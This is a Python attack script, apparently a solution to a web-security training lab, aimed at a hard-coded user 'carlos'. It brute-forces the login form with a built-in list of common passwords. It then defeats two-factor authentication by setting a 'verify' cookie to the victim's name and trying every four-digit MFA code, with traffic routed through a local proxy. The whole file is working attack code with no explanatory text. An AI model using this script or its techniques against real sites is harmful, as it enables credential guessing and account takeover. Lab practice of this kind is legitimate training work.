import requests
import sys
import urllib3
from colorama import Fore, init
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
init(autoreset=True)
username = 'carlos'
passwords = ['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666', 'qwertyuiop', '123321', 'mustang', '1234567890', 'michael', '654321', 'superman', '1qaz2wsx', '7777777', '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm', 'asdfgh', 'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew', 'tigger', 'sunshine', 'iloveyou', '2000', 'charlie', 'robert', 'thomas', 'hockey', 'ranger', 'daniel', 'starwars', 'klaster', '112233', 'george', 'computer', 'michelle', 'jessica', 'pepper', '1111', 'zxcvbn', '555555', '11111111', '131313', 'freedom', '777777', 'pass', 'maggie', '159753', 'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda', 'summer', 'love', 'ashley', 'nicole', 'chelsea', 'biteme', 'matthew', 'access', 'yankees', '987654321', 'dallas', 'austin', 'thunder', 'taylor', 'matrix', 'mobilemail', 'mom', 'monitor', 'monitoring', 'montana', 'moon', 'moscow']

def get_cookie(url_2fa):
    try:
        response = requests.get(url_2fa)
        cookies = response.cookies
        cookie_values = {cookie.name: cookie.value for cookie in cookies}
        return cookie_values
    except Exception as e:
        print("Error:", e)
        return None
    
def remove_http(url):
    if url.startswith("http://"):
        return url[len("http://"):]
    elif url.startswith("https://"):
        return url[len("https://"):]
    else:
        return url

def exploit(url):
    print(Fore.YELLOW + '[!] This may take sometime to success..')
    print(Fore.YELLOW + f'[!] Trying to find the correct password..')
    for password in passwords:
        credentials = {'username': username, 'password': password}
        login_url = url + '/login'
        try:
            r = requests.post(login_url, data=credentials, verify=False, proxies=proxies)
            res = r.text
            if 'Invalid username or password' not in res:
                print(Fore.GREEN + f'[+] {username}:{password} is valid')
                return credentials
        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")

def main():
    global url_2fa
    if len(sys.argv) != 2:
        print(Fore.YELLOW + "[+] Usage: %s <url>" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1] 
    url_2fa = url + '/login2'
    valid_credentials = exploit(url)

    if valid_credentials:
        print(Fore.YELLOW + f'[!] Brute forcing the security code.....')
        url0x = remove_http(url)  
        login_url = url + '/login'
        credentials = {'username': username, 'password': valid_credentials['password']}
        cookies = get_cookie(url)
        try:
            login_response = requests.post(login_url, data=credentials, verify=False, proxies=proxies)
        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")
            sys.exit(-1)

        headers = {
            'Host': url0x,
            'Cookie': '; '.join([f'{key}={value}' for key, value in cookies.items()]) + '; verify=carlos',
            'Content-Length': '13',
            'Cache-Control': 'max-age=0',
            'Sec-Ch-Ua': '"Chromium";v="117", "Not;A=Brand";v="8"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': 'Windows',
            'Upgrade-Insecure-Requests': '1',
            'Origin': url,
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': url_2fa,
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9'
        }

        for i in range(10000):
            code = f'{i:04d}'
            s = requests.post(url_2fa, headers=headers, data={'mfa-code': code}, verify=False, proxies=proxies)
            res = s.text
            if 'Incorrect security code' not in res:
                print(Fore.GREEN+ f'[+] Verification code is {code}')
                return True

if __name__ == "__main__":
    main()
